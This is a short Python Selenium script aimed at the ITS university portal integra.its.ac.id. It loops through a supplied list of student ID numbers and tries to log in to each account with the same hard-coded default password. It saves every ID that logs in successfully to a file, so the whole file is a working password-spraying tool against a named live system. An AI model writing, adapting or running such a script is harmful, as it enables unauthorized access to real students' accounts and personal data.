from fire import Fire
from tqdm import tqdm
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
option = Options()
option.add_argument('--start-maximized')


def login(nrp):
    driver.find_element_by_name('userid').send_keys(nrp)
    driver.find_element_by_name('password').send_keys('surabaya')
    driver.find_element_by_name('password').send_keys(Keys.ENTER)

def logout():
    selectelement = driver.find_element_by_id('navbarDropdown')
    selectelement.click()
    driver.find_element_by_xpath('/html/body/nav/div/ul/li/div/a[3]').click()


def wait_til(xpath):
    WebDriverWait(driver, 2).until(
        EC.visibility_of_element_located((By.XPATH, xpath))
    )


url = 'https://integra.its.ac.id/'
driver = webdriver.Chrome(
    executable_path='../../chromedriver', options=option)
driver.get(url)


def main(nrp_txt_path):

    koleksi_nrp = open(nrp_txt_path).read().splitlines()
    i = 0
    jumlah_berhasil = 0

    for nrp in tqdm(koleksi_nrp):
        driver.delete_all_cookies()
        login(nrp)
        i += 1
        try:
            body = driver.find_element(By.TAG_NAME, 'body')
            if 'SI Beasiswa' in body.text:
                with open('berhasil.txt', 'a') as f:
                    f.writelines(nrp+'\n')
                logout()
                jumlah_berhasil += 1
                print(nrp, 'masuk')
                driver.delete_all_cookies()
                print('jumlah berhasil: ', jumlah_berhasil)
            else:
                driver.delete_all_cookies()
        except:
            driver.delete_all_cookies()
    driver.quit()


if __name__ == '__main__':
    Fire(main)